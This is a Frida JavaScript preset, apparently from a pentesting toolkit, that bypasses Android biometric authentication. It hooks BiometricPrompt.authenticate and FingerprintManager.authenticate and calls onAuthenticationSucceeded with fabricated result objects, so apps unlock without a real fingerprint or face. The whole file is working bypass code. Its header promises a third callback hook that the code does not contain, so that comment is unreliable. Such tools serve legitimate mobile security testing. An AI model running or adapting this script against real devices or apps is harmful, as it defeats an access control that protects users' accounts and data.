/*
 * Harm0niz3r preset: biometric_bypass.js
 *
 * Forces success for BiometricPrompt / FingerprintManager auth flows,
 * so a pentester can step past biometric gates without enrolling a
 * fingerprint or face on the test device.
 *
 * V1 hooks:
 *   - androidx.biometric.BiometricPrompt.authenticate(...) ->
 *     synthetically deliver an AuthenticationResult to the
 *     AuthenticationCallback.
 *   - android.hardware.fingerprint.FingerprintManager.authenticate(...) ->
 *     same trick using FingerprintManager.AuthenticationResult.
 *   - androidx.biometric.BiometricPrompt$AuthenticationCallback ->
 *     short-circuit onAuthenticationSucceeded / Failed / Error to
 *     'success' when the app polls the callback directly.
 */

Java.perform(function () {

  function safe(label, fn) {
    try { fn(); send("[biometric_bypass] hooked: " + label); }
    catch (e) { send("[biometric_bypass] skipped: " + label + " (" + e + ")"); }
  }

  // ---- androidx.biometric.BiometricPrompt ----
  safe("androidx.biometric.BiometricPrompt.authenticate", function () {
    var Prompt = Java.use("androidx.biometric.BiometricPrompt");
    Prompt.authenticate.overloads.forEach(function (overload) {
      overload.implementation = function () {
        send("[biometric_bypass] BiometricPrompt.authenticate(...) -> forcing onAuthenticationSucceeded");
        try {
          // Reach into the prompt's stored AuthenticationCallback and
          // call onAuthenticationSucceeded(...) with a no-crypto result.
          var Result = Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult");
          var AuthenticationType = 2; // BIOMETRIC
          var instance = Result.$new(null, AuthenticationType);
          // Many app integrations store the callback as 'mCallback' or
          // similar; try the public field first, then reflection.
          var fields = Prompt.class.getDeclaredFields();
          for (var i = 0; i < fields.length; i++) {
            var f = fields[i];
            try {
              f.setAccessible(true);
              var v = f.get(this);
              if (v && v.getClass &&
                  v.getClass().getName().indexOf("AuthenticationCallback") !== -1) {
                v.onAuthenticationSucceeded(instance);
                return;
              }
            } catch (e) { /* keep scanning */ }
          }
        } catch (e) {
          send("[biometric_bypass] could not synthesise success: " + e);
        }
      };
    });
  });

  // ---- android.hardware.fingerprint.FingerprintManager ----
  safe("android.hardware.fingerprint.FingerprintManager.authenticate", function () {
    var FM = Java.use("android.hardware.fingerprint.FingerprintManager");
    FM.authenticate.overloads.forEach(function (overload) {
      overload.implementation = function (crypto, cancel, flags, cb, handler) {
        send("[biometric_bypass] FingerprintManager.authenticate -> faking success");
        try {
          var Result = Java.use("android.hardware.fingerprint.FingerprintManager$AuthenticationResult");
          var fake = Result.$new(crypto, null, 0);
          cb.onAuthenticationSucceeded(fake);
        } catch (e) {
          send("[biometric_bypass] could not deliver synthesised success: " + e);
        }
      };
    });
  });

  send("[biometric_bypass] ready");
});
